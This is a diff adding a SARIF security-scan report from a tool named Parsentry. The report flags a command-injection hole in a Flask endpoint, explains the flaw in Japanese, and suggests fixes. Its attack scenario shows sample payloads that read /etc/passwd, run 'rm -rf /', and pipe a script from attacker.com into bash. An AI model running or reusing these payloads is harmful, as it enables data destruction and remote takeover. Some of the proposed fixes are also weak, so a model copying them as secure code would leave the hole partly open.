@@ -1,0 +1,49 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Parsentry",
+          "version": "0.14.0",
+          "rules": [
+            {
+              "id": "RCE",
+              "name": "Remote Code Execution",
+              "shortDescription": {
+                "text": "Untrusted user input is passed directly to subprocess.run() with shell=True, allowing arbitrary command execution"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "RCE",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Remote Code Execution vulnerability detected in execute_command endpoint",
+            "markdown": "## リモートコード実行（RCE）脆弱性\n\n### 脆弱性の詳細\nエンドポイント `/exec/command` （178-200行目）では、ユーザーから入力された `command` パラメータが何の検証・サニタイズもなく、`subprocess.run()` に直接渡されています。\n\n### 脆弱なコード\n```python\n@api_bp.route('/exec/command', methods=['POST'])\ndef execute_command():\n    \"\"\"Command injection vulnerability\"\"\"\n    data = request.get_json()\n    command = data.get('command', '')  # ← untrusted input\n    \n    try:\n        result = subprocess.run(\n            command,                    # ← 直接コマンド実行\n            shell=True,                # ← シェルメタキャラクタが解釈される\n            capture_output=True, \n            text=True,\n            timeout=10\n        )\n        ...\n```\n\n### PAR分析\n\n**Principal（主体）**: ユーザーからのPOSTリクエスト（`command` パラメータ）\n\n**Action（制御）**: 入力値に対する検証・サニタイズが存在しない\n\n**Resource（リソース）**: OS コマンド実行（`subprocess.run()`）\n\n### 攻撃シナリオ\n\n攻撃者は以下のようなペイロードを送信することで、任意のOSコマンドを実行できます：\n\n```json\n{\n  \"command\": \"cat /etc/passwd; rm -rf /\"\n}\n```\n\nまたは、シェルメタキャラクタを使用した複数コマンド実行：\n\n```json\n{\n  \"command\": \"whoami && id && curl http://attacker.com/shell.sh | bash\"\n}\n```\n\n### 影響範囲\n- サーバー上の任意のコマンド実行\n- ファイルシステムへのアクセス・改変・削除\n- 他システムへの横展開\n- データ盗聴・改ざん\n\n### 根本原因\n\n1. `shell=True` の使用により、シェルメタキャラクタ（`;`, `|`, `&&`, `||` など）が解釈される\n2. ユーザー入力に対する検証が一切存在しない\n3. コマンドホワイトリスト、入力制限、サンドボックス化などの対策がない\n\n### 推奨される修正\n\n1. **シェルを使用しない**：\n   ```python\n   subprocess.run(command.split(), shell=False)\n   ```\n\n2. **ホワイトリスト検証**：\n   ```python\n   allowed_commands = ['ls', 'pwd', 'whoami']\n   if command not in allowed_commands:\n       return jsonify({'error': 'Command not allowed'}), 403\n   ```\n\n3. **入力長制限とキャラクタ制限**：\n   ```python\n   if len(command) > 100 or not command.isalnum():\n       return jsonify({'error': 'Invalid command'}), 400\n   ```\n\n4. **権限最小化**：\n   - Pythonプロセスを専用の低権限ユーザーで実行\n   - 機能別のコンテナ化・サンドボックス化\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/api.py"
+                },
+                "region": {
+                  "startLine": 186
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.95
+          }
+        }
+      ]
+    }
+  ]
+}
